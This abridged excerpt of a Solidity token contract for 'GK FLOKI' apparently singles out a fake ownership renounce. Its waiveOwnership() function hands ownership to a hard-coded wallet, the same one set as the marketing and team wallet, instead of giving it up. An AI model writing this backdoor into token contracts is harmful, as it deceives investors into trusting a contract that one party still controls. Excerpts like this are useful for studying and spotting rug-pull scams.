...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x4a2ab3562554D7aC20e68C76E30e42C370b1Dca4);
    }
...
contract GKFLOKI is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "GK FLOKI";
    string private _symbol = "GKFLOKI";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x4a2ab3562554D7aC20e68C76E30e42C370b1Dca4);
    address payable private teamWalletAddress = payable(0x4a2ab3562554D7aC20e68C76E30e42C370b1Dca4);
